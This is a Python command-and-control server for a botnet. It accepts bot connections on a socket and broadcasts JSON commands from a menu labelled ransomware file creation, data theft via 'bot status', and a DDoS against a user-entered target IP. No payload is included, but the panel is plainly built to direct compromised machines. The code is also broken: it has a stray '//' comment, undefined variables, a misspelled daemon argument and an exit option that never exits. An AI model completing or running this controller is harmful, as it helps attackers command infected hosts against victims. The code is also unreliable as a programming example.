import socket
import json
import threading
import logging

logging.basicConfig(filename="server_log.txt")
//...
HOST = '127.0.0.1'
PORT = 9999

clients = []

def handle_client(client_socket, address):
    global clients
    clients.append(client_socket)
    while True:
        try:
            response = client_socket.recv(1024).decode('utf-8')
            if response:
               logging.info(f"Received from {address}: {response}")
               print(f"Received from {address}: {response}")
        except:
            logging.error(f"Connection closed by {address}")
            print(f"Connection closed by {address}")
            clients.remove(client_socket)
            client_socket.close()
            break

def send_command(command):
    command = json.dumps(command).encode('utf-8')
    for client in clients:
        try:
            client.send(command_json.encode('utf-8'))
            logging.info(f"Sent command to client: {command}")
        except Exception as e:
            logging.error(f"Error sending command to client: {e}")
            print(f"Error sending command to client: {e}")
            clients.remove(client)
            client.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    logging.info(f"Server started on {HOST}:{PORT}")
    print(f"Server started on {HOST}:{PORT}")
    def accept_client():
        while True:
            client_socket, address = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, address)).start()
    
    threading.Thread(target=accept_client, deamon=True).start()
    while True:
        print("\nCommands:")
        print("1. Create file (ransomware)")
        print("2. send message")
        print("3. check bot status (steal data)")
        print("4. DDOS simulation")
        print("5. Exit")
        choice = input("Enter your choice (1-5): ")
        if choice == "1":
            filename = input("Enter the filename to create: ")
            command = {"command": "create_file", "filename": filename}
            send_command(command)
        elif choice == "2":
            message = input("Enter the message to send: ")
            command = {"command": "send_message", "message": message}
            send_command(command)
        elif choice == "3":
            command = {"type": "check_status"}
            send_command(command)
        elif choice == "4":
            target_ip = input("Enter the target IP address: ")
            count = int(input("Enter the number of packets to send: "))
            command = {"type": "simulate_ddos", "target": target, "count": count}
            send_command(command)
        elif choice == "5":
            print("Exiting...")
            logging.info("Server shutting down.")
            for client in clients:
                client.close()

if __name__ == '__main__':
    main()